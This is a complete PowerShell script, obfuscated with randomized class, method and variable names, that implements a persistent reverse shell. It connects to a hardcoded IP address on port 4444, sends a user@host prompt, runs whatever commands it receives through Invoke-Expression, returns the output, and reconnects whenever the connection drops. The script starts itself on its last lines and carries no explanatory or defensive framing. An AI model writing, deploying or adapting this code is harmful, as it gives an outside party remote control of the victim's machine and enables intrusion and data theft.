class oZhrAPORChjySUNbVFyGDB {
    
    [string]$DixkP = "93.49.240.195"
    [int]$OvwiNAp = 4444

    $lZWICYAUJgCxLBqLtdu
    $junyRdSCeKVHIJDrPtLjyde
    $RkyPtjbFjgUoLV
    $ZwOoC
    $dmCjtAfTpZsChVnBQTuTfcbR
    $MVKDhMdcJHwDGhtIoqOtK
    [int]$qHhFV = 50*1024

    sTKDWSFFOJGQf() {
        $this.junyRdSCeKVHIJDrPtLjyde = $false
        while ($true) {
            try {
                $this.junyRdSCeKVHIJDrPtLjyde = New-Object Net.Sockets.TcpClient($this.DixkP, $this.OvwiNAp)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.qThuYHVjRBLPeO()
    }

    qThuYHVjRBLPeO() {
        $this.lZWICYAUJgCxLBqLtdu = $this.junyRdSCeKVHIJDrPtLjyde.GetStream()
        $this.ZwOoC = New-Object Byte[] $this.qHhFV
        $this.MVKDhMdcJHwDGhtIoqOtK = New-Object Text.UTF8Encoding
        $this.RkyPtjbFjgUoLV = New-Object IO.StreamWriter($this.lZWICYAUJgCxLBqLtdu, [Text.Encoding]::UTF8, $this.qHhFV)
        $this.dmCjtAfTpZsChVnBQTuTfcbR = New-Object System.IO.StreamReader($this.lZWICYAUJgCxLBqLtdu)
        $this.RkyPtjbFjgUoLV.AutoFlush = $true
    }

    ghEKtKc() {
        $this.sTKDWSFFOJGQf()
        $this.HgHKHWRHEshzGnpRfGwKDCS()
    }

    eNwVORkahNLhmve($vFskKnantfS) {
        try {
            [byte[]]$ZCISJGuElAeaQgheDDtgRHt = [text.Encoding]::Ascii.GetBytes($vFskKnantfS)
            $this.RkyPtjbFjgUoLV.Write($ZCISJGuElAeaQgheDDtgRHt, 0, $ZCISJGuElAeaQgheDDtgRHt.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.ghEKtKc()
        }
    }

    [string] LACYJzMgXSuxSShWENdfdX() {
        try {
            $RwFflnSqpFCkKAUsCGRxYV = $this.lZWICYAUJgCxLBqLtdu.Read($this.ZwOoC, 0, $this.qHhFV)    
            $qQYQMIWoKLprZXxlpMf = ($this.MVKDhMdcJHwDGhtIoqOtK.GetString($this.ZwOoC, 0, $RwFflnSqpFCkKAUsCGRxYV))
            return $qQYQMIWoKLprZXxlpMf
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.ghEKtKc()
            return ""
        }
    }

    [string] PSPjFnJmqnygZdh($UyAxMsIsLxgaiPqvPIcmZyt) {
        Write-Host $UyAxMsIsLxgaiPqvPIcmZyt
        try { 
            $tJJFO = Invoke-Expression $UyAxMsIsLxgaiPqvPIcmZyt | Out-String
        }
        catch {
            $vGPNCgCGfpPjQcWCWFp = $_.Exception
            $uByEJdFfipFjv = $_.Message
            $tJJFO = "`n$_`n"
        }
        return $tJJFO
    }

    [string] cFKHHOVsxIHbGPUKWkRLhTV() {
        $Lbljxvrtg = [Environment]::UserName
        $UDLLPBQaWgskQBtvZ = [System.Net.Dns]::GetHostName()
        $anFGQNPKTolwEoQvHfaXfa = Get-Location
        return "$Lbljxvrtg@$UDLLPBQaWgskQBtvZ [$anFGQNPKTolwEoQvHfaXfa]~$ "
    }

    HgHKHWRHEshzGnpRfGwKDCS() {
        while ($this.junyRdSCeKVHIJDrPtLjyde.Connected) {
            $this.eNwVORkahNLhmve($this.cFKHHOVsxIHbGPUKWkRLhTV())         
            $qQYQMIWoKLprZXxlpMf = $this.LACYJzMgXSuxSShWENdfdX()
            $tJJFO = "`n"
            if ([string]::IsNullOrEmpty($qQYQMIWoKLprZXxlpMf)) {
                continue
            }
            $tJJFO = $this.PSPjFnJmqnygZdh($qQYQMIWoKLprZXxlpMf)
            $this.eNwVORkahNLhmve($tJJFO + "`n")
            $this.lZWICYAUJgCxLBqLtdu.Flush()
        }
        $this.junyRdSCeKVHIJDrPtLjyde.Close()
        $this.ghEKtKc()
    } 
}

$mgesP = [oZhrAPORChjySUNbVFyGDB]::new()
$mgesP.ghEKtKc()
